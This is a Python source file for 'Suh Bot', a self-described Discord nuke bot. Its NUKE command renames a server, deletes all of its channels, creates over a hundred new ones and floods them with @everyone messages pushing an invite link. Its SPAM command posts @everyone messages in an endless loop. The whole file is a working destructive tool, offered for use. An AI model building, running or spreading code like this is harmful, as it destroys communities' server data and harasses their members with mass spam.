import discord
import colorama
from discord.ext import commands
from discord.ext.commands import Bot
from colorama import Fore, Back, Style

token=''# Token Here

colorama.init(autoreset=True)

n=0

print(f"{Fore.RED}   ▒█▀▀▀█ ▒█░▒█ ▒█░▒█    ▒█▀▀█ ▒█▀▀▀█ ▀▀█▀▀")
print(f"{Fore.RED}   ░▀▀▀▄▄ ▒█░▒█ ▒█▀▀█    ▒█▀▀▄ ▒█░░▒█ ░▒█░░")
print(f"{Fore.RED}   ▒█▄▄▄█ ░▀▄▄▀ ▒█░▒█    ▒█▄▄█ ▒█▄▄▄█ ░▒█░░")
print()
print(f'{Fore.GREEN}        ~~~~~~~~~~~~~~~~~~~~~~~~~~~   ')
print()
print(f'{Fore.GREEN}                  Suh Bot             ')
print(f'{Fore.GREEN}            The Discord Nuke Bot      ')
print(f'{Fore.GREEN}               Help: suh!HELP         ')
print(f'{Fore.GREEN}            Credits: suh!CREDITS      ')

client = commands.Bot(command_prefix='suh!')

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game('Suh Bot | Type suh!HELP to help.'))
    print(f'{Fore.YELLOW}            Bot Status: On-Line      ')
    print()
    print(f'{Fore.GREEN}        ~~~~~~~~~~~~~~~~~~~~~~~~~~~   ')

@client.command(pass_context=True)
async def HELP(ctx):
    embed = discord.Embed(colour = discord.Colour.green())
    embed.set_author(name='Suh Bot HELP')
    embed.add_field(name='suh!NUKE', value='Is Activate A Nuke', inline=False)
    embed.add_field(name='suh!SPAM', value='Is Activate A Spam', inline=False)
    await ctx.send(embed=embed)

@client.command(pass_context=True)
async def CREDITS(ctx):
    embed = discord.Embed(colour = discord.Colour.red())
    embed.set_author(name='Suh Bot CREDITS')
    embed.add_field(name='hecker#7913', value='The Owner Of Bot', inline=False)
    embed.add_field(name='windows 11 (in beta)#4571', value='Helper of create script', inline=False)
    await ctx.send(embed=embed)

@client.command()
async def NUKE(ctx):
    await ctx.guild.edit(name='SUH BOT WINNING!!!')

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0

    while(n<=100):
        await guild.create_text_channel('suh-bot')
        n = n+1

    for c in ctx.guild.text_channels:
        await c.send('@everyone THE SERVER HAS NUKED! http://discord.gg/SSbwgZaXYB')
        await c.send('@everyone THE SERVER HAS NUKED! http://discord.gg/SSbwgZaXYB')
        await c.send('@everyone THE SERVER HAS NUKED! http://discord.gg/SSbwgZaXYB')


@client.command()
async def SPAM(ctx):
    while True:
        await ctx.send('@everyone THE SERVER HAS SPAMED! http://discord.gg/SSbwgZaXYB')

client.run(token)
